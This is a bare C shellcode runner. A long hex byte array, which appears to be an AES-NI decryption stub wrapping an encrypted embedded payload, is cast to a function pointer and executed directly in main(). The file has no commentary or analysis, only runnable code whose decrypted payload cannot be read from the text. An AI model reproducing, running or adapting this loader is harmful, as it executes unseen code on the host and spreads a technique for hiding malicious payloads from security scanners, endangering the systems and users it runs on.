#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x40\x2b\x7e\x15\x16\x28\xae\xd2\xa6\xab\xf7\x15\x88\x09\xcf\x4f\x3c\x4e\xb1\xcd\xf5\x55\xf9\xbe\x63\x18\xfe\x67\x79\x72\x07\x42\x74\x91\x0c\x22\xaa\x43\x7a\x1e\xb8\x49\xa7\x28\xca\x7a\x5c\x0c\x20\xff\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x48\x8d\x05\xc9\xff\xff\xff\xb9\x02\x00\x00\x00\x48\x83\xe4\xf0\x48\x83\xec\x10\xeb\x08\x48\x83\xc0\x10\xe2\xf8\xeb\xb2\x49\x89\xe2\xf3\x0f\x6f\x2d\xc7\xff\xff\xff\xf3\x0f\x6f\x0d\x8f\xff\xff\xff\x48\x83\xec\x10\xf3\x0f\x7f\x0c\x24\x66\x0f\x3a\xdf\xd1\x01\xe8\xcd\x01\x00\x00\x48\x83\xec\x10\xf3\x0f\x7f\x0c\x24\x66\x0f\x3a\xdf\xd1\x02\xe8\xb9\x01\x00\x00\x48\x83\xec\x10\xf3\x0f\x7f\x0c\x24\x66\x0f\x3a\xdf\xd1\x04\xe8\xa5\x01\x00\x00\x48\x83\xec\x10\xf3\x0f\x7f\x0c\x24\x66\x0f\x3a\xdf\xd1\x08\xe8\x91\x01\x00\x00\x48\x83\xec\x10\xf3\x0f\x7f\x0c\x24\x66\x0f\x3a\xdf\xd1\x10\xe8\x7d\x01\x00\x00\x48\x83\xec\x10\xf3\x0f\x7f\x0c\x24\x66\x0f\x3a\xdf\xd1\x20\xe8\x69\x01\x00\x00\x48\x83\xec\x10\xf3\x0f\x7f\x0c\x24\x66\x0f\x3a\xdf\xd1\x40\xe8\x55\x01\x00\x00\x48\x83\xec\x10\xf3\x0f\x7f\x0c\x24\x66\x0f\x3a\xdf\xd1\x80\xe8\x41\x01\x00\x00\x48\x83\xec\x10\xf3\x0f\x7f\x0c\x24\x66\x0f\x3a\xdf\xd1\x1b\xe8\x2d\x01\x00\x00\x48\x83\xec\x10\xf3\x0f\x7f\x0c\x24\x66\x0f\x3a\xdf\xd1\x36\xe8\x19\x01\x00\x00\x48\x83\xec\x10\xf3\x0f\x7f\x0c\x24\x66\x41\x0f\x38\xdb\x92\x60\xff\xff\xff\x48\x83\xec\x10\xf3\x0f\x7f\x14\x24\x66\x41\x0f\x38\xdb\x92\x70\xff\xff\xff\x48\x83\xec\x10\xf3\x0f\x7f\x14\x24\x66\x41\x0f\x38\xdb\x52\x80\x48\x83\xec\x10\xf3\x0f\x7f\x14\x24\x66\x41\x0f\x38\xdb\x52\x90\x48\x83\xec\x10\xf3\x0f\x7f\x14\x24\x66\x41\x0f\x38\xdb\x52\xa0\x48\x83\xec\x10\xf3\x0f\x7f\x14\x24\x66\x41\x0f\x38\xdb\x52\xb0\x48\x83\xec\x10\xf3\x0f\x7f\x14\x24\x66\x41\x0f\x38\xdb\x52\xc0\x48\x83\xec\x10\xf3\x0f\x7f\x14\x24\x66\x41\x0f\x38\xdb\x52\xd0\x48\x83\xec\x10\xf3\x0f\x7f\x14\x24\x66\x41\x0f\x38\xdb\x52\xe0\x48\x83\xec\x10\xf3\x0f\x7f\x14\x24\xf3\x0f\x6f\x08\x66\x41\x0f\xef\x8a\x50\xff\xff\xff\x66\x41\x0f\x38\xde\x8a\x40\xff\xff\xff\x66\x41\x0f\x38\xde\x8a\x30\xff\xff\xff\x66\x41\x0f\x38\xde\x8a\x20\xff\xff\xff\x66\x41\x0f\x38\xde\x8a\x10\xff\xff\xff\x66\x41\x0f\x38\xde\x8a\x00\xff\xff\xff\x66\x41\x0f\x38\xde\x8a\xf0\xfe\xff\xff\x66\x41\x0f\x38\xde\x8a\xe0\xfe\xff\xff\x66\x41\x0f\x38\xde\x8a\xd0\xfe\xff\xff\x66\x41\x0f\x38\xde\x8a\xc0\xfe\xff\xff\x66\x41\x0f\x38\xdf\x4a\xf0\xf3\x0f\x7f\x08\x4c\x89\xd4\xe9\x04\xfe\xff\xff\x66\x0f\x70\xd2\xff\x66\x0f\x6f\xd9\x66\x0f\x38\x00\xdd\x66\x0f\xef\xcb\x66\x0f\x38\x00\xdd\x66\x0f\xef\xcb\x66\x0f\x38\x00\xdd\x66\x0f\xef\xcb\x66\x0f\xef\xca\xc3";


int main()
{

//	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	